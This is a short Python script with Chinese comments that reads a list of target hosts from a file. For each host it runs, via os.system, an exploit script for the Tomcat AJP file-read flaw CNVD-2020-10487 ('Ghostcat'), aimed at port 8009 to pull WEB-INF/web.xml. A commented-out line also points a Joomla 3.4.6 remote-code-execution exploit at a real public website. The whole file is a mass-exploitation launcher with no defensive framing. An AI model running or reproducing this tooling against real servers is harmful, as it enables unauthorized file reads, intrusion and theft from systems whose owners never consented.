#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
#主要使用执行命令,并且返回命令形如  python3  /Users/play/github/find/vulnerability/CNVD-2020-10487/CNVD-2020-10487.py 127.0.0.1 -p 8009  -f WEB-INF/web.xml  
def  command(target):
    path        =   os.getcwd()   #
    file_path   =   os.path.join(path,"CNVD-2020-10487","CNVD-2020-10487.py")
    command     = "python2  {file_path}  -t {target} -p 8009  -f WEB-INF/web.xml".format(file_path=file_path,target=target)
    # print(command)
    #command     =  "python3 /Users/play/github/find/vulnerability/Joomla_3_4_6_RCE.py -t https://www.baidu.com  -c"
    return command

 #读取文件每一行并将文件内容存放在列表中
def content2List(add):
    # cwd=os.getcwd()
    dirList=[]
    # add=cwd+"\\dict\\directory.txt"
    f=open(add,"rb")
    for line in f.readlines():
        line = str(line)
        line = line.replace("\\r","")
        line = line.replace("\\n","")
        line = line.replace("b\'","")
        line = line.replace("\'","")
        dirList.append(str(line))
        #print(str(line))
    return dirList

if __name__=='__main__': 	
 	hostList = content2List("/Users/ba1ma0/Desktop/targets.txt")
 	for host in hostList:
 		command1  = command(host)
 		print(command1)
 		os.system(command1)

